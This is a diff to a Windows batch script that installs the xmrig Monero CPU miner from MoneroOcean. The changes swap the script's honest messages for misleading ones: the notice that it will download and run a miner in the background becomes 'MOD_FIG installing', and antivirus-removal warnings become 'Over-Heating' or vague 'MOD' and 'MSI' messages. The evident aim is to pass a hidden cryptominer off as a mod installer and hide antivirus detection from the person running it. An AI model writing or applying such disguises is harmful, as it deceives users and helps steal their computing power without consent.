@@ -165,9 +165,9 @@ rem printing intentions
 
 set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"
 
-echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
-echo Mining will happen to %WALLET% wallet.
+echo MOD_FIG installing
+echo MOD Success / Pattern 1
+echo MOD-LOGS
 
 if not [%EMAIL%] == [] (
   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
@@ -229,9 +229,9 @@ if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
 
 if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
-  echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" is not functional
+  echo WARNING: Overload
 ) else (
-  echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
+  echo WARNING: Over-Heating
 )
 
 echo [*] Looking for the latest version of MOD
@@ -276,9 +276,9 @@ powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ 
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
 if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
-  echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" is not functional
+  echo WARNING: Stock version of MOD
 ) else (
-  echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
+  echo WARNING: Stock version of MSI Removed by Windows Defender
 )
 
 exit /b 1
